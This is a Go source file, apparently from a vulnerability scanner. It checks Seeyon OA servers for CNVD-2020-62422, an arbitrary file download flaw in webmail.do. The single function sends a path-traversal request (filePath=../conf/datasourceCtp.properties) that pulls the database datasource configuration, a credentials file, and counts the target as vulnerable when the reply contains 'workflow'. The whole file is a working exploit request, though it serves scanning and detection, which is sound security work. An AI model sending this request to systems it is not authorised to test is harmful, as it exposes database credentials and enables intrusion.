package seeyon

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

//webmail.do任意文件下载

func CNVD_2020_62422(u string) bool {
	if req, err := http.Request(u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "workflow") {
			return true
		}
	}
	return false
}
